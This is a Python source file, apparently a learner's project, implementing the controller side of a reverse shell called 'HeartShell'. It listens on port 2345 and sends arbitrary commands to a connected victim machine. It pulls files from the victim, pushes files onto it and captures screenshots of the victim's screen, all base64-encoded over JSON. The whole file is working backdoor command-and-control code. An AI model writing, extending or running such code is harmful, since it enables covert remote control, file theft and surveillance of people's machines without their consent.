#!/usr/bin/python3

import socket
from termcolor import colored
import json
import base64



def reliable_send(data):
    json_data = json.dumps(data) 
    target.send(json_data.encode('utf-8')) # HERE IS WHERE THE DATA IS ENCODED TO SEND THROUGH SOCKET


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode('utf-8') # HERE IS WHERE DATA RECV DECODED FOR JSON MANIPULATION
            return json.loads(data)
        except ValueError:
            continue


def shell():
    global count
    while True:
        command = input(f"*HeartShell-{str(ip)}#: ") # data type String
        # reliable_send(command.encode('utf-8')) # already dumps by json (? data type) --> need convert??
        reliable_send(command)  # answer line 27: no convert --> JSON doesn't apply to bytes
        # End shell session
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue

        # Download File
        elif command[:8] == "download":
            with open(command[9:], 'wb') as f:
                file_content = reliable_recv()
                # f.write(base64.b64decode(file_content).decode('utf-8'))
                f.write(base64.b64decode(file_content))

        # Upload file
        elif command[:6] == "upload":
            try:
                with open(command[7:], 'rb') as f:
                    file_content = base64.b64encode(f.read()) 
                    reliable_send(file_content.decode('utf-8'))
            except:
                failed = b"Upload Failed!"      # Base64 encode works with bytes
                reliable_send(base64.b64encode(failed).decode('utf-8'))
        
        # Screenshot bot monitor
        elif command[:10] == "screenshot":
            with open(f"screenshot-{count}.png", "wb") as f:
                image = reliable_recv()
                
                image_decoded = base64.b64decode(image)

                if image[:3] == "[-]":
                    print(image_decoded)
                else:
                    f.write(image_decoded)
                    count += 1

        else:
            # result = target.recv(1024) # data type Bytes
            result = reliable_recv() # need decode??? --> nope, already decode in the function
            print(result)

def server():
    # Creating global variables so that can be used in different functions
    global s
    global target
    global ip
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    host = '0.0.0.0'
    port = 2345


    s.bind((host, port))
    s.listen(5)

    print(colored("[+] Listening for incoming connection ...", 'green'))

    target, ip = s.accept()

    print(colored(f"[+] Connection established from: {str(ip)}", 'green'))

    s.close()

count = 0
server()
shell()